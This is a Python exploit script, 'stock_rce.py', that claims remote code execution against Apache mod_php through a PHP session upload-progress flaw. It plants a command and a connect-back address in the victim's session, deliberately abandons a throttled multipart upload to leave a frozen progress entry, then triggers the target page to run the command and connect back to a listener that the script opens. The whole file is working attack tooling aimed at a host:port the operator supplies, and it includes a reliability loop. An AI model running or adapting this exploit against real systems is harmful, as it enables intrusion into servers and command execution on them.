#!/usr/bin/env python3
"""stock_rce.py — upload-progress UAF RCE on STOCK PHP config.

Stock means: session.upload_progress.cleanup=1, min_freq=1s, freq=1%,
use_only_cookies=1, memory_limit=128M, post_max 8M, upload_max 2M — none
of the staging knobs our original chain needed.

The lever: cleanup only fires when a request COMPLETES. A client that
abandons a throttled upload mid-body makes PHP bail out of the rfc1867
read, cleanup is skipped, and the progress entry stays in the session
file frozen at bytes_processed < content_length — the staleness
signature, manufactured by stock behavior alone. No OOM, no ini edits.

Chain per run (all requests carry Cookie: PHPSESSID=sid):
  R1 plant   -> normal full multipart POST; cmd + connect-back addr land
                in the session; its progress entry gets cleaned up (fine).
  R2 abandon -> PROG part + ~1.8MB file part; client sends ~half at
                200KB/0.7s then CLOSES. PHP aborts mid-upload; the entry
                survives frozen.
  R3 gate    -> app reads its own progress entry; frozen => system(cmd)
                dialing back to us; banner printed.

Usage:
  ./stock_rce.py 192.168.51.170:18990 [--cmd CMD] [--rport N] [--n K]
  ./stock_rce.py host:port --control     # R2 completes (no abandon):
        proves stock cleanup wipes the entry -> R3 says NOENTRY

Venue requirement unchanged: Apache mod_php. PHP >= 8.3-era 8.3.x
(unpatched, or patched — the staleness gate is CVE-adjacent).
"""
import argparse, os, re, socket, sys, threading, time

PROG = 'PHP_SESSION_UPLOAD_PROGRESS'
BOUND = '----uaf'

def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 53)); return s.getsockname()[0]
    except OSError:
        return '127.0.0.1'
    finally:
        s.close()

def field(name, val):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"\r\n\r\n' + val.encode() + b'\r\n')

def filehead(name, fname):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"; filename="' + fname.encode() + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n')

def http(host, port, path, body, cookie=None, timeout=15.0):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        if body is not None:
            hdr = ('POST %s HTTP/1.1\r\nHost: x\r\nCookie: %s\r\nContent-Type: multipart/form-data; '
                   'boundary=%s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
                   % (path, cookie, BOUND, len(body)))
            try:
                s.sendall(hdr.encode() + body)
            except BrokenPipeError:
                pass
        else:
            s.sendall(('GET %s HTTP/1.1\r\nHost: x\r\nCookie: %s\r\nConnection: close\r\n\r\n'
                       % (path, cookie)).encode())
        s.settimeout(timeout)
        data = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        return data.decode('utf-8', 'replace')
    finally:
        s.close()

def ls_bind(port_, backlog=1, tmo=6):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port_)); s.listen(backlog); s.settimeout(tmo)
    return s

def run_once(host, port, rhost, rport, cmd, n, control=False, complete=False,
             pubstate=False, mb=1800000, chunk=200000, delay=0.7, abort_at=0.55):
    sid = ('uu%06d%06d' % (n + 1, (int(time.time()) * 1000) % 1000000))[:26]
    cookie = 'PHPSESSID=%s' % sid

    # R1: normal plant (completes; its entry is cleaned — stock behavior)
    r1 = (field(PROG, 'pl') + field('pl', cmd) + field('rh', '%s:%d' % (rhost, rport))
          + filehead('file', 'p.bin') + b'A' * 4096 + b'\r\n'
          + b'--' + BOUND.encode() + b'--\r\n')
    resp1 = http(host, port, '/app.php', r1, cookie=cookie)
    if 'PLANTED=1' not in resp1:
        return dict(ok=False, note='R1 failed: ' + (resp1.splitlines()[-1][:60] if resp1 else 'no reply'))

    # R2: throttled upload in a background thread — the RACE window.
    # Stock cleanup=1 keeps the progress entry alive only DURING parse;
    # R3 must arrive mid-flight. Entry ticks need >=1s gaps (min_freq=1),
    # so we drip 200KB per 0.6s for a ~5s window and land R3 at ~1.2s.
    box2 = []
    def r2_worker(abandon):
        try:
            tail = b'\r\n--' + BOUND.encode() + b'--\r\n'
            head = field(PROG, 'pl') + filehead('file', 'big.bin')
            total = len(head) + mb + len(tail)
            s = socket.create_connection((host, port), timeout=30)
            s.sendall(('POST /app.php HTTP/1.1\r\nHost: x\r\nCookie: %s\r\n'
                       'Content-Type: multipart/form-data; boundary=%s\r\n'
                       'Content-Length: %d\r\nConnection: close\r\n\r\n'
                       % (cookie, BOUND, total)).encode())
            s.sendall(head)
            sent = 0
            stop_at = int(mb * abort_at)
            while sent < mb:
                step = min(chunk, mb - sent)
                s.sendall(b'A' * step)
                sent += step
                if abandon and sent >= stop_at:
                    break
                time.sleep(delay)
            if abandon:
                s.close()   # client walks away mid-body: PHP bails, no session write
                box2.append('abandoned@%d' % sent)
            else:
                s.sendall(tail)
                s.settimeout(30)
                data = b''
                try:
                    while True:
                        c = s.recv(8192)
                        if not c:
                            break
                        data += c
                except socket.timeout:
                    pass
                s.close()
                box2.append('complete' if 'WINDOWS=' in data.decode('utf-8', 'replace') else 'reply-no-marker')
        except Exception as e:
            box2.append('ERR %s' % e)
    t2 = None
    if not (control or pubstate):
        abandon = not complete
        t2 = threading.Thread(target=lambda: r2_worker(abandon), daemon=True); t2.start()
        if abandon:
            n_ab = max(1, int(mb * abort_at / chunk))
            time.sleep((n_ab - 1) * delay + 0.6)   # land R3 just after the bailout
        else:
            time.sleep(1.2)
    else:
        box2.append('skipped')
    if pubstate:
        box2.append('pubstate')

    # banner listener before R3
    ls = ls_bind(rport)
    box = []
    def relay():
        try:
            conn, _ = ls.accept(); conn.settimeout(15)
            data = b''
            while True:
                try:
                    c = conn.recv(4096)
                except socket.timeout:
                    break
                if not c:
                    break
                data += c
                if b'-revshell-OK' in data:
                    break
            box.append(data.decode('utf-8', 'replace'))
            conn.close()
        except Exception:
            pass
    th = threading.Thread(target=relay, daemon=True); th.start()
    if pubstate:
        # R3 IS the window: tiny POST carrying the progress field + ?pl=1.
        # On builds whose session machinery pre-starts inside an upload
        # window, the gate fires on published-state alone — no R2, no ini.
        body3 = (field(PROG, 'pl') + filehead('file', 'w.bin') + b'A' * 1024
                 + b'\r\n--' + BOUND.encode() + b'--\r\n')
        resp3 = http(host, port, '/app.php?pl=1', body3, cookie=cookie)
    else:
        resp3 = http(host, port, '/app.php?pl=1' if False else '/app.php', None, cookie=cookie)
    th.join(timeout=10)
    ls.close()
    if t2:
        t2.join(timeout=45)
    resp2 = box2[0] if box2 else 'none'
    m = re.search(r'PLRUN FROZEN=(\d) INFLIGHT=(\d) BYTES=(\d+) CLEN=(\d+)', resp3 or '')
    frozen = tuple(int(g) for g in m.groups()) if m else (-1, -1, -1, -1)
    pub = bool(re.search(r'PLRUN PUBSTATE=1', resp3 or ''))
    shell = bool(box) and '-revshell-OK' in box[0]
    return dict(ok=(pub if pubstate else frozen[0] == 1), shell=shell, banner=(box[0] if box else ''),
                r2=resp2, frozen=frozen,
                note='%sfrozen=%d inflight=%d bytes=%d/%d r2=%s' % (
                    'PUBSTATE=1 ' if pub else '',
                    frozen[0], frozen[1], frozen[2], frozen[3], resp2))

def main():
    ap = argparse.ArgumentParser(description='stock-config upload-progress UAF RCE')
    ap.add_argument('target', help='host[:port], port default 80')
    ap.add_argument('--cmd', default='id -un; echo hello-from-stock')
    ap.add_argument('--rport', type=int, default=4455)
    ap.add_argument('--rhost', default=None)
    ap.add_argument('--n', type=int, default=1)
    ap.add_argument('--pubstate', action='store_true',
                    help='stock path on window-pre-starting builds: R3 is a tiny progress-field POST; gate fires on published-state')
    ap.add_argument('--control', action='store_true', help='no R2 at all: R3 should say NOENTRY')
    ap.add_argument('--complete', action='store_true', help='R2 completes: stock cleanup wipes the entry (frozen=-1)')
    args = ap.parse_args()
    host, _, port = args.target.partition(':')
    port = int(port or 80)
    rhost = args.rhost or local_ip()
    good = 0
    for i in range(args.n):
        r = run_once(host, port, rhost, args.rport, args.cmd, i,
                     control=args.control, complete=args.complete, pubstate=args.pubstate)
        line = ('[%d/%d] ' % (i + 1, args.n) if args.n > 1 else '') + r['note']
        if r.get('banner'):
            line += '  <- ' + ' / '.join(r['banner'].splitlines())
        print(line, flush=True)
        if r['ok'] and r['shell']:
            good += 1
    if args.n > 1:
        print('reliability: %d/%d' % (good, args.n))
    sys.exit(0 if (good == args.n or args.control or args.complete) else 1)

if __name__ == '__main__':
    main()
